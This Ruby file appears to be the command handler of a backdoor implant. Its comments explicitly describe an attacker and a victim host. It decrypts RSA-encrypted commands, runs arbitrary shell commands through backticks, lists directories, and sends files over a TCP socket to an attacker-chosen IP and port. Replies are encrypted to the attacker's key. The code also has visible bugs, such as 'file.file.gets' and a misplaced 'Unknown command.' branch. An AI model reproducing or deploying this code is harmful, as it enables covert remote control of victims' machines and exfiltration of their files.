#!/usr/bin/env ruby

require "openssl"
require "socket"

# -------------------------------------------------------------
# Dispatch
#
# Respond to an incomming command.
# -------------------------------------------------------------

class Dispatch

	@response = ""

	def initialize(ciphertext)
		plaintext = decrypt ciphertext

		# Split up the request so we can pass the parameters to the correct method
		request = plaintext.split

		case request[0].downcase
		when "ls"
			ls request[1]
		when "get"
			get request[1], request[2], request[3]
		when "die"
			die
		when "cmd"
			cmd request[1]
			"Unknown command."
		end
	end

# -------------------------------------------------------------
# Commands
# -------------------------------------------------------------

	# LS
	#
	# List the contents of the current directory, or a given 
	# directory path.
	
	def ls(path = "")
		cmd 'ls ' + path
	end

	# Get
	# 
	# Send a file back to the attacker on a specified port

	def get(path, ip, port)
		# Make sure the file exists
		if ! File.file? path
			return "Sorry, that file does not exist."
		else
			tcp = TCPSocket.new(ip, port)

			File.open(path, "rb") do |file|
				while(line = file.file.gets)
					tcp.send(line)
				end
			end
			
			@response = "Sending Complete"

			# Begin passing file to client

		end
	end

	# Die
	#
	# Shut the program down.

	def die()
		#TODO any necessary clean up?
		exit
	end

	# Cmd
	#
	# Run any command and send the result to the attacker.

	def cmd(command)
		@response = `#{command}`
	end

	# to_string
	#
	# Returns the response of the command
	def to_string()
		return encrypt @response
	end

# -------------------------------------------------------------
# Encryption
#
# Asymmetric ncryption scheme for the victim host. Encrypt
# using the attackers public key, decrypt using its own 
# private key.
# -------------------------------------------------------------

	# Encrypt
	#
	# Encrypt a string using the attacker's public key and return
	# the cipher text.

	def encrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
		return key.public_key.public_encrypt(data)
	end

	# Dcrypt
	#
	# Decrypt cipher text using the vicitim's private key and
	# return the result. 

	def decrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
		return key.private_decrypt(data)
	end

# -------------------------------------------------------------
# Fin
# -------------------------------------------------------------

end
